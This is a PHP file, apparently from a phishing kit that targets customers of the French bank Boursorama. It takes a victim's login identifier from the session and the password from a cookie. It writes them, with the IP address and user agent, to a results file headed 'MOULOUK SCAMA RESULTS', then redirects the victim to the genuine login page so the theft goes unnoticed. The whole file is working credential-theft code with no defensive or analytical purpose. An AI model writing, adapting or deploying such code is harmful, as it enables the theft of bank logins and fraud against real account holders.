<?php
// Start the session
session_start();

?>

<?php
error_reporting(0);
function getUserIpAddr(){
    if(!empty($_SERVER['HTTP_CLIENT_IP'])){
        //ip from share internet
        $ip = $_SERVER['HTTP_CLIENT_IP'];
    }elseif(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])){
        //ip pass from proxy
        $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
    }else{
        $ip = $_SERVER['REMOTE_ADDR'];
    }
    return $ip;
}
$userAgent=$_SERVER['HTTP_USER_AGENT'];
$ipClient=getUserIpAddr();
$id_client=$_SESSION['identifiant'];
$motdepasse=$_COOKIE['passvalue'];
$motdepasse=strval($motdepasse);

$monfichier= fopen('Resultats.txt','a+');

fputs($monfichier,"MOULOUK SCAMA RESULTS");fputs($monfichier,"\r\n");
fputs($monfichier,"***********************************************************************************");
fputs($monfichier,"\r\n\r\n");
fputs($monfichier,"Ip Client ===> $ipClient ");
fputs($monfichier,"\r\n\r\n");
fputs($monfichier,"User Agent ===> $userAgent ");
fputs($monfichier,"\r\n\r\n");
fputs($monfichier,"Identifiant Booursorama ===> $id_client ");
fputs($monfichier,"\r\n\r\n");
fputs($monfichier,"Mot de passe Boursorama ===> $motdepasse ");
fputs($monfichier,"\r\n\r\n");
fputs($monfichier,'--------------------------------------------------------------------------------------');

fclose($monfichier);


?>

<script>document.location.href="https://clients.boursorama.com/connexion/"</script>